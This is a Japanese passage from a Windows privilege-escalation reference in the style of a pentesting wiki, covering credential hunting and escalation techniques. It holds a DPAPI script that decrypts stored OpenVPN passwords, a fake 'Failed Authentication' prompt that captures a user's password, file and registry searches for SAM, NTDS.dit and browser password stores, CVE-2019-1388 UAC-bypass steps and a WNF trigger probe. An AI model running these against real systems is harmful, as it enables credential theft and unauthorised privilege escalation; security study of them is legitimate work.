配信対象の webroot に古い ZIP バックアップが直接置かれていると、以前の構成ファイルや再利用可能な認証情報が漏えいする可能性があります。漏えいと判断する前に、サイトに設定された物理パスと、アーカイブに HTTP 経由で実際にアクセスできるかを確認してください。既定の `C:\inetpub\wwwroot` は候補の1つにすぎません。アーカイブを開かずに名前とサイズを一覧表示するには、ローカルで簡単な棚卸しを実行します。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブ名だけでは、秘密情報が含まれていることも、見つかった認証情報でより高い権限を得られることも証明できません。

### OpenVPN 認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

ユーザーが知っていると思われる場合は、**ユーザー自身の認証情報、あるいは別のユーザーの認証情報を入力するよう依頼できます**（クライアントに**認証情報**を直接**尋ねる**のは、本当に**危険**であることに注意してください）。

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていたことが確認されているファイル。

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe 拡張子を使わないファイル名リスト版

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 のデータベースでは、一般に `.psafe3` 拡張子が使われます。一致するファイル名は暗号化された vault の候補として扱ってください。そのファイルが存在するだけでは、内容を読み取れる、ロックを解除できる、または保存された認証情報を使用できることの証明にはなりません。保存場所を確認する際は、アクセス可能なユーザープロファイルと設定済みのファイル共有ルートを確認してください。

読み取り可能な KeePass `.kdbx` も、暗号化された vault の手がかりにすぎません。ロックを解除するには、実際のマスターパスワードと、設定されているキーファイルやアカウント要素が必要です。許可された調査でエントリ内に LM:NT ハッシュのペアが見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントと、NT ハッシュが現在も有効で、対象の NTLM サービスに受け入れられることを確認してください。vault のエントリだけで Administrator または SYSTEM 権限が得られるわけではありません。リモートサービスへのアクセス、アカウント権限、および別途必要なサービス実行手順もすべて満たされている必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報は出力しないでください。

提案されたファイルをすべて検索します：

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe 拡張機能なしの検索コマンド版

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### ごみ箱内の認証情報

認証情報を探すため、ごみ箱も確認してください。

アクセス可能なごみ箱のエントリを確認し、削除されたバックアップや設定アーカイブに加え、ファイル名に認証情報が明記されているファイルも探してください。有用な `.7z`、`.zip`、`.rar` のバックアップは、数か月前のものだったり、一般的なファイル名が付いていたりする場合があります。Windows は元のパスと削除時刻を `$I` レコードに保存し、削除されたファイルを対応する `$R` エントリとして保存します。アーカイブを開く前に、メタデータと現在のユーザー ID による読み取りアクセス権を確認してください。表示される内容はボリューム、ユーザー SID、ファイル権限によって異なるため、一覧が空でも復元可能なバックアップがないとは限りません。アーカイブ名は確認候補として扱い、有効なシークレットが含まれている証拠とはみなさないでください。

アクセス可能な削除済み `.pfx` は、**コード署名**の手掛かりにもなります。アクセス可能な秘密鍵が含まれていれば、その鍵を使って変更した PowerShell スクリプトに署名できます。[PowerShell で署名するには、秘密鍵を持つコード署名証明書が必要です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の発行元ルールは、署名者の ID とルールの適用範囲を評価します](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。別アカウントとして実行するには、現在のユーザー ID が対象スクリプトそのものを変更できること、スクリプトと対象アカウントに対して結果の署名を許可する有効なルールがあること、さらに、より高い権限で実際に実行するスケジュールされたタスクなどの実行主体が存在することが必要です。`.pfx` というファイル名、証明書のサブジェクト、または書き込み可能なスクリプトだけでは、この一連の条件が揃っているとは判断できません。秘密鍵の情報を開いたり、タスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも確認し、認証情報の手掛かりを探してください。BitLocker 回復情報のエクスポートは HTML または TXT 形式で保存されている場合があり、名前の付いたバックアップアーカイブに含まれていることもあります。このようなデータから、古いバックアップを含む別の暗号化データボリュームにアクセスできる場合があります。アクセスが許可されている場合に限り、ボリュームとアーカイブを確認してください。バックアップに `NTDS.dit` が含まれている場合、オフラインでドメイン認証情報を復元するには、[バックアップと特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)に記載されているように、一致する `SYSTEM` ハイブも必要です。ファイル名やロックされたボリュームだけでは、利用可能な回復キーやドメインバックアップが存在するとは判断できません。

複数のプログラムに保存された**パスワードを復元する**には、次のツールを使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報が含まれている可能性のあるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**レジストリから openssh keys を抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome または Firefox** のパスワードが保存されている db を確認してください。\
**Chrome、Edge、または Firefox** のパスワードが保存されている db を確認してください。\
ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが保存されている**可能性があります。

現在のユーザーの標準的な Edge **Default** プロファイルでは、`Login Data` は `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` にあり、`Local State` は親ディレクトリの `User Data` にあります。[Microsoft は既定のプロファイルの場所を説明しています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別のプロファイルや `UserDataDir` ポリシーによって場所が変わる場合があります。ファイルの存在は、認証情報ストアの調査につながる手掛かりにすぎません。読み取り可能なファイルか、該当ユーザーの DPAPI コンテキストまたはその他の許可されたキー素材が利用できるか、保存されたログインがより高い権限を持つアカウントのものかを確認してください。パスだけを列挙する場合、データベースを開いたり、復号したパスワードを出力したりする必要はありません。

Firefox について、[Mozilla の説明](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)によると、プロファイル内の `key4.db` と `logins.json` は、鍵ファイルと暗号化されたログイン情報ファイルのペアです。これらのファイルの存在は手掛かりにすぎません。両方のファイルが読み取り可能か、保存されたエントリがあるか、認証情報を利用可能だと判断する前に Primary Password が鍵を保護しているかを確認してください。復元した認証情報がドメインアカウントのものなら、そのアカウントの実効的なグループ制御権と、グループの [LAPS パスワードの読み取りまたは復号権限](../active-directory-methodology/laps.md)を別々に確認してください。ブラウザーのアーティファクトだけでは、管理者権限への経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows オペレーティングシステムに組み込まれた技術で、異なる言語で作られたソフトウェアコンポーネント間の**相互通信**を可能にします。各 COM コンポーネントは **class ID (CLSID)** で**識別され**、各コンポーネントは、interface ID (IID) で識別される1つ以上のインターフェースを通じて機能を提供します。

COM クラスとインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** をマージして作成されます。

このレジストリの CLSID 内には、子レジストリ **InProcServer32** があります。ここには **DLL** を指す**既定値**と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、または **Neutral** (Thread Neutral) を指定できる **ThreadingModel** という値が含まれています。

![ブラウザーの履歴 - COM DLL Overwriting: このレジストリの CLSID 内には、子レジストリ InProcServer32 があります。ここには DLL を指す既定値と、値...が含まれています](<../../images/image (729).png>)

基本的に、実行される DLL を**上書き**でき、その DLL が別のユーザーによって実行されるなら、**権限昇格**が可能です。

攻撃者が永続化の手段として COM Hijacking をどのように利用するかについては、以下を参照してください。


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリで一般的なパスワードを検索**

**ファイルの内容を検索**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名を持つファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名とパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **はmsf** pluginです。私は、victim内のcredentialsを検索するすべてのMetasploit POST moduleを**自動実行する**ためにこのpluginを作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)は、このページで紹介されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne)も、システムからパスワードを抽出する優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の**sessions**、**usernames**、**passwords**を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

**SYSTEMとして実行中のプロセスが、新しいプロセス** (`OpenProcess()`) **をフルアクセスで開く**状況を想像してください。同じプロセスが、**低い権限で新しいプロセスを作成** (`CreateProcess()`) **し、メインプロセスのすべてのオープンハンドルを継承させます**。\
その後、**低権限のプロセスにフルアクセスできる**場合、`OpenProcess()` で作成された特権プロセスへの**オープンハンドルを取得**し、**shellcodeを注入**できます。\
[この脆弱性の**検出と悪用方法**の詳細については、こちらの例を参照してください。](leaked-handle-exploitation.md)\
[プロセスやスレッドが継承した、異なるアクセス許可レベル（フルアクセスに限りません）のオープンハンドルをテストして悪用する方法について、より詳しく解説した**別の記事はこちらです**。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**パイプ**と呼ばれる共有メモリセグメントを使って、プロセス間の通信とデータ転送を行えます。

Windowsには**Named Pipes**と呼ばれる機能があり、異なるネットワーク上であっても、無関係なプロセス間でデータを共有できます。これはクライアント／サーバーアーキテクチャに似ており、役割は**named pipe server**と**named pipe client**として定義されます。

**クライアント**がパイプ経由でデータを送信すると、パイプを設定した**サーバー**は、必要な**SeImpersonate**権限があれば、**クライアントのIDを偽装**できます。偽装可能なパイプを介して通信する**特権プロセス**を特定できれば、自分が用意したパイプとそのプロセスがやり取りしたときに、そのIDを偽装して**より高い権限を取得**できます。この攻撃の実行手順については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)にあるガイドが参考になります。

また、次のツールを使うと、burpのようなツールで**named pipeの通信を傍受できます:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。さらに、このツールを使うと、すべてのpipeを一覧表示して確認し、privescsを探せます。 [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

サーバーモードのTelephonyサービス（TapiSrv）は、`\\pipe\\tapsrv`（MS-TRP）を公開します。リモートの認証済みクライアントは、mailslotベースの非同期イベント経路を悪用し、`ClientAttach`を通じて、`NETWORK SERVICE`が書き込み可能な既存ファイルの任意の位置に**4バイトを書き込む**ことができます。その後、Telephonyの管理者権限を取得し、任意のDLLをサービスとして読み込ませることができます。全体の流れは次のとおりです。

- `pszDomainUser`に書き込み可能な既存のパスを指定して`ClientAttach`を呼び出すと、サービスは`CreateFileW(..., OPEN_EXISTING)`でそのファイルを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize`から攻撃者が制御する`InitContext`をそのハンドルに書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）でline appを登録し、`TRequestMakeCall`（`Req_Func 121`）をトリガーして、`GetAsyncEvents`（`Req_Func 0`）で取得した後、登録解除またはシャットダウンを行うことで、決定的な書き込みを繰り返せます。
- `C:\Windows\TAPI\tsec.ini`の`[TapiAdministrators]`に自分を追加して再接続し、任意のDLLパスを指定して`GetUIDllName`を呼び出すと、`NETWORK SERVICE`として`TSPI_providerUIIdentify`を実行できます。

詳細はこちら：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windowsで実行される可能性のあるファイル拡張子

**[https://filesec.io/](https://filesec.io/)** を確認してください。

### Markdownレンダラー経由のProtocol handler / ShellExecuteの悪用

`ShellExecuteExW`に渡されるクリック可能なMarkdownリンクは、危険なURI handler（`file:`、`ms-appinstaller:`、または登録済みの任意のscheme）を起動し、現在のユーザーとして攻撃者が制御するファイルを実行する可能性があります。詳細はこちら：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを含むコマンドラインの監視**

ユーザーとしてshellを取得したとき、**コマンドラインで認証情報を渡す**スケジュール済みタスクやその他のプロセスが実行されている可能性があります。以下のスクリプトは2秒ごとにプロセスのコマンドラインを取得し、現在の状態と前回の状態を比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース (コンソールまたは RDP 経由) にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから「NT\AUTHORITY SYSTEM」としてターミナルやその他のプロセスを実行できます。

これにより、同じ脆弱性を利用して、権限昇格と UAC のバイパスを同時に実現できます。さらに、何もインストールする必要はなく、この処理で使用されるバイナリは Microsoft によって署名され、発行されています。

影響を受けるシステムには、次のようなものがあります。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、次の手順を実行する必要があります：

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

必要なファイルと情報は、次の GitHub リポジトリにあります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator の Medium から High Integrity Level への昇格 / UAC Bypass

**Integrity Levels**について学ぶには、こちらを読んでください。


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses**について学ぶには、こちらを読んでください。


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Web で公開されたルートへの Upload Directory Junctions

アプリケーションが予測可能なアップロード用サブディレクトリを作成し、呼び出し元が指定したファイル名を使ってファイルを書き込み、その後そのファイルを処理することがあります。低い権限のユーザーがサーバー側の書き込み前にそのサブディレクトリを削除し、NTFS junction に置き換えられる場合、書き込みが junction をたどって Web で公開されたディレクトリに到達する可能性があります。そこに配置したスクリプトは、サーバーがそのファイル形式を実行する場合、Web サービスの ID で実行される可能性があります。これはアプリケーション固有の任意書き込み境界であり、書き込み可能なアップロードディレクトリや既存の junction だけでは、その存在を証明できません。

アップロードハンドラーでの正確なパス構築と処理タイミング、サブディレクトリに対するユーザーの実効的な削除・作成権限、宛先の実効 ACL、書き込み処理が reparse point をたどるかどうか、そして Web サーバーが宛先でファイルを実行するかどうかを確認してください。書き込み処理と Web サーバーのプロセス ID は、それぞれ別々に確認してください。受動的なインベントリ調査でディレクトリ ACL や reparse メタデータを確認できますが、ハンドラーの動作や将来の junction の差し替えまでは立証できません。実行がサービスアカウントに到達する場合、別の token-privilege 経路を検討する前に、**実際のプロセストークン**を調べてください。

## WNF をトリガーとする特権スケジュールタスクのクリーンアップ

手動実行が拒否されるスケジュールタスクでも、権限のないユーザーが利用できるトリガーが存在する場合があります。特権タスクを監査する際は、XML をエクスポートし、タスクの DACL、principal、action に加えて、**すべての**トリガーを調べてください。特に、`WnfStateChangeTrigger` は Windows Notification Facility (WNF) の state を指定します。その securable state で現在のユーザーによる更新の publish が許可されていれば、`<AllowStartOnDemand>false</AllowStartOnDemand>` であっても、ユーザーは設定された ID でタスクを間接的に開始できます。<sup>[[43]](#references)</sup>

たとえば Recall の `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` タスクは SYSTEM として実行され、標準ユーザーからの WNF state `7508BCA32C079E41` の更新を受け付け、Recall が無効になっていても `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` を調べていました。<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

到達可能性をテストするには、`ntdll.dll` から `ZwUpdateWnfStateData` を解決し、8 バイトの state name に対して空の更新を送信して、戻りステータスをタスクの最終実行データまたは Procmon のアクティビティと照合します。以下の簡略化したプローブでは、Recall タスクの例のバイトシーケンスを使用しています。テスト対象のタスク用にエクスポートされたバイトに置き換えてください。<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### 再帰的なクリーンアップを特権削除に変える

重要なプリミティブはトリガー単体ではなく、攻撃者が制御するディレクトリを受け取る特権クリーンアップルーチンです。列挙から最終的な変更までの処理を追跡してください。プロファイル／セッションの検出、ワイルドカードで選択された子要素、`SHCreateItemFromParsingName`、`IFileOperation::DeleteItem` は、事前に確認されたパス名が後で再帰的にたどられることを示す強い手掛かりです。信頼できるディレクトリハンドルを基準に子孫を開いて削除前に検証していなければ、攻撃者は列挙から使用までの間にパス解決先を変更できます。<sup>[[43]](#references)</sup>

WNFトリガーを、以下で説明する [oplock、junction、Object Manager symlink による置き換え](#from-folder-contents-delete-to-system-eop)と組み合わせます。oplock によって、正規の子要素を選択した後にクリーンアップを一時停止させ、その間に書き込み可能な祖先ディレクトリを置き換えます。すると、再開後の特権削除は `\RPC Control` を経由して保護対象を解決します。Recall の攻撃チェーンでは、これにより、文書化されている MSI rollback 技法に必要な `C:\Config.Msi` を SYSTEM 権限で削除できました。<sup>[[31]](#references)[[43]](#references)</sup>

### ネストされた子孫は浅い reparse-point 対策を回避する

攻撃者が制御するルートと直下の子要素だけを検証しても、パス名ベースの再帰削除は安全になりません。検証済みオブジェクトは正規のままにして、junction/oplock による置き換えをさらに下の子要素に移します。すると、`IFileOperation::DeleteItem` は最終的に未検証の子孫に到達し、新しい対象をたどります。CVE-2026-20941 は、最初の Recall パッチが `UKP` と GUID 形式のディレクトリを検証した一方で、従来の再帰削除処理を残したため、まさにこの種の不完全な修正から発生しました。<sup>[[43]](#references)</sup>

安全な方法は、**すべての子孫**を、すでに信頼されているディレクトリハンドルを基準に開き、最終的に解決されたパス／オブジェクトを取得して検証し、その検証済みハンドルに対して削除 disposition を適用することです。パスの先頭部分だけを検証してから、パス名ベースの再帰削除に戻ってはいけません。パッチをレビューする際は、実際の呼び出し箇所にある構造体も確認してください。このケースでは、`NtCreateFile` における `OBJECT_ATTRIBUTES` を実行時に調べた結果、`RootDirectory` が非 NULL で、名前が相対パス `{GUID}\\secure_file.lock` であることが分かりました。これにより、2つ目の `FILE_DELETE_ON_CLOSE` プリミティブがあると示唆する誤解を招く逆コンパイラー出力が否定されました。<sup>[[43]](#references)</sup>

## 任意のフォルダーの削除／移動／名前変更から SYSTEM EoP へ

この手法は[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されており、exploit code は[**こちらで入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installer の rollback 機能を悪用し、アンインストール中に正規のファイルを悪意あるファイルに置き換えます。そのために攻撃者は、`C:\Config.Msi` フォルダーを乗っ取るための**悪意ある MSI installer**を作成する必要があります。このフォルダーは後に、Windows Installer が他の MSI パッケージのアンインストール中に rollback ファイルを保存するために使用します。その rollback ファイルを改変して、悪意ある payload を含ませます。

### Windows Installer COM クリーンアップパスへのインジェクション（CVE-2025-27727）

低権限のクライアントは、`CMsiConfigurationManager` COM オブジェクト（CLSID/IID `{000C101C-0000-0000-C000-000000000046}`）を通じて、SYSTEM 権限で動作する `msiexec.exe` サービスにアクセスできます。リバースエンジニアリングにより、関連する `IMsiServer` 呼び出しは、vtable オフセット `0xA0` の `MsiBeginTransactionW`、`0xC8` の `SetEEUIDirectoryAndFilter`、`0x50` の `CleanupTempPackages` と特定されました。これらの名前とオフセットはリバースエンジニアリングによるもので、ビルドによって異なる場合があります。<sup>[[41]](#references)</sup>

非管理者の場合、`SetEEUIDirectoryAndFilter` は、指定されたパスを `DELETE`、`FILE_FLAG_BACKUP_SEMANTICS`、`FILE_FLAG_OPEN_REPARSE_POINT` を指定して開く間だけ、呼び出し元になりすまします。これにより、呼び出し元がディレクトリを削除できることが確認され、reparse point をたどることも避けられます。しかし、チェックしたファイルオブジェクトが後続のクリーンアップ処理に結び付けられるわけではなく、そのファイルが Windows Installer によって作成されたことも証明されません。<sup>[[41]](#references)</sup>

